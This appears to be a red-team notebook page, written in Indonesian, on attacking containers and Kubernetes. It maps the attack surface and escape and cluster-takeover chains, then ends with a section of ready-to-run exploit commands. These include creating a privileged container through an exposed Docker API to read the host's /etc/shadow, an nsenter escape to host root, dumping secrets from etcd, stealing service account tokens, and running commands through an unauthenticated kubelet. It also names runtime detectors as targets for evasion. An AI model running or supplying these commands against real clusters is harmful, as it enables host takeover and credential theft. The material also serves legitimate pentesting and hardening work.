---
title: Attack Perspective — Container/K8s (Red Team)
tags:
- attack
- red-team
- container
- k8s
- escape
- rbac
- service-account
- admission
created: 2026-08-14
updated: 2026-08-14
status: complete
cssclasses:
  - wide-table
  - callout
---

# Container/K8s — Perspektif Penyerang

> Container = shared kernel, K8s = control plane. Red team serang: container escape (runc/containerd), RBAC abuse, service account token, admission controller bypass, image supply chain.

## 1. Attack Surface K8s

| Komponen | Vektor | MITRE ID | Tool / CVE | Evasion | Detection Gap |
|----------|--------|----------|------------|---------|----------------|
| **Container Runtime** | Escape via runc/containerd/kernel | T1611 | CVE-2024-21626 (runc), CVE-2019-5736 | Container → host root | Falco/Tetragon = eBPF, partial |
| **K8s API Server** | Anonymous access, token theft, RBAC abuse | T1078.004 | kubectl, rbac-lookup | Token = valid auth | Audit log = verbose noise |
| **Service Account** | Mounted SA token → API access | T1078.004 | kubectl exec, curl k8s API | SA = legit pod identity | SA audit = noisy |
| **Pod/Deployment** | Modify deployment → inject malicious pod | T1611 | kubectl apply, helm | Pod = legit deployment | K8s audit = delayed |
| **Admission Controller** | Bypass policy (PodSecurity, OPA) | T1611 | Custom admission bypass, label spoof | Policy = namespace-scoped gap | Admission audit = rare |
| **Image** | Malicious base image, tag hijack | T1195.002 | Docker Hub name spoof, tag confusion | Image = valid signature (if any) | Image scan = post-deploy |
| **RBAC** | Over-permissive role → escalate | T1078.004 | RoleBinding create, cluster-admin | Role = legit assignment | RBAC audit = rare |
| **Secrets** | Secret mount → credential theft | T1552 | kubectl get secrets, env dump | Secret = valid config | Secret audit = rare |

## 2. Container Escape Chain

```
Inside Container (initial access):
  ├── Web app RCE / dependency confusion → shell in pod
  ├── Check capabilities: cat /proc/1/status | grep CapEff
  ├── Check mount: mount | grep host
  ├── Check seccomp: cat /proc/1/status | grep Seccomp
  └── Check namespace: lsns
    ↓
Escape Method 1 — runc (CVE-2024-21626):
  ├── File descriptor leak → escape ke host filesystem
  ├── Write payload ke host → execute → host RCE
  └→ Container → host root
    ↓
Escape Method 2 — Kernel Exploit:
  ├── CVE-2024-1086 (nf_tables UAF) → kernel RCE from container
  ├── Container share kernel → kernel exploit = host root
  └→ Container → host kernel → root
    ↓
Escape Method 3 — Capability:
  ├── CAP_SYS_ADMIN → mount host disk → chroot → escape
  ├── CAP_SYS_PTRACE → ptrace host process → inject
  ├── CAP_SYS_MODULE → load kernel module → rootkit
  └── CAP_DAC_READ_SEARCH → read host file bypass permission
    ↓
Escape Method 4 — Host Path Mount:
  ├── /var/run/docker.sock mounted → docker API → privileged container
  ├── / mounted → chroot → escape
  └── /proc mounted → write /proc/sysrq → kernel trigger
    ↓
Post-Escape: Host root → node → cluster → cloud
```

## 3. K8s Cluster Attack Chain

```
Recon: Identifikasi K8s (kubeconfig, KUBERNETES_SERVICE_HOST env)
  ├── Pod env: KUBERNETES_SERVICE_HOST + PORT → API endpoint
  ├── SA token: /var/run/secrets/kubernetes.io/serviceaccount/token
  └── DNS: kubernetes.default.svc → API server
    ↓
Initial Access (from pod):
  ├── SA token → curl API → list permissions (self-subject-review)
  ├── RBAC check: can-i create pods? list secrets? exec?
  └→ If pod create → privileged pod → node access
    ↓
Privilege Escalation:
  ├── Create privileged pod (hostPID + hostNetwork) → node root
  ├── Abuse RoleBinding → cluster-admin
  ├── Secret theft → cloud credential → cloud access
  └→ Node compromise → kubelet → control plane
    ↓
Lateral:
  ├── Pod → node → node → cluster (via kubelet API)
  ├── Secret → cloud cred → cloud services
  └→ Service mesh → east-west traffic intercept
    ↓
Persistence:
  ├── DaemonSet → persistent pod on every node
  ├── CronJob → periodic re-trigger
  ├── Admission webhook → backdoor all future pods
  └→ K8s secret → cloud credential → perpetual access
```

## 4. Tool Stack

| Tool | Use |
|------|-----|
| **kubectl** | API access, RBAC enum, pod exec, secret read |
| **kube-hunter** | K8s penetration test (automated) |
| **kube-bench** | K8s security benchmark (CIS) |
| **rbac-lookup** | RBAC role → permission mapping |
| **kubeletctl** | kubelet API abuse (exec, port-forward) |
| **Falco / Tetragon** | Runtime detection (eBPF) — target untuk evasi |
| **CVE-2024-21626 PoC** | runc container escape |

## 5. Referensi
- CVE-2024-21626 — https://nvd.nist.gov/vuln/detail/CVE-2024-21626
- kube-hunter — https://github.com/aquasecurity/kube-hunter
- kube-bench — https://github.com/aquasecurity/kube-bench
- HackTricks K8s — https://book.hacktricks.xyz/network-services-pentesting/kubernetes
- Kubernetes Security (CKS) — https://kubernetes.io/docs/concepts/security/

## Konkret — Container/K8s Exploit Payload (Testable)

### Container Escape — runC (CVE-2019-5736)

```bash
# Payload di dalam container: overwrite /bin/sh di host via runC
# 1. Cari PID runC di host
# 2. Tulis payload ke /proc/<pid>/exe
# 3. Tunggu admin exec ke container → runC di-overwrite

# PoC:
# libcontainer exploit → runtime ./runc --help
# Setelah escape: host shell

# Docker socket poisoning (sering di CTF)
# Docker API exposed → create privileged container
curl -X POST http://target:2375/containers/create -d '{
  "Image": "alpine",
  "Binds": ["/:/mnt"],
  "Privileged": true,
  "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]
}'
```

### Privileged Pod → Host Root

```bash
# Jika pod privileged: mount host filesystem
kubectl exec -it pod -- /bin/sh
# atau
docker run -it --privileged -v /:/mnt alpine chroot /mnt

# nsenter (PID 1 host)
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

### etcd API — Cluster Takeover

```bash
# etcd exposed (biasanya port 2379, internal service)
curl http://etcd:2379/version
# Baca secrets/konfigurasi cluster
curl http://etcd:2379/v3/kv/range -X POST -d '{"key": "L3NlY3JldHMv"}'

# Service account token (untuk kubectl)
cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl --token=<token> get pods -n kube-system
```

### kubelet API (Port 10250, tanpa auth)

```bash
# Kubelet read-only: cek pods & container
curl http://node:10250/pods

# Kubelet kubeletExec (RCE jika anonymous auth enabled)
# CVE-2018-1002105 (kubectl exec proxy bypass)
curl -X POST http://node:10250/run/namespace/pod/container -d 'cmd=id'
```

### K8s Attack Checklist

1. Kubelet 10250 — `curl http://node:10250/pods`
2. API server 6443 — cek anonymous/unauth
3. etcd 2379 — secrets dump
4. Service account token — apakah punya perms?
5. Privileged pod — nsenter escape
6. runC/CVE-2019-5736 — host binary overwrite
7. Helm/charts — secrets in configmaps
8. Network policies — apakah ada?
---

audited
---
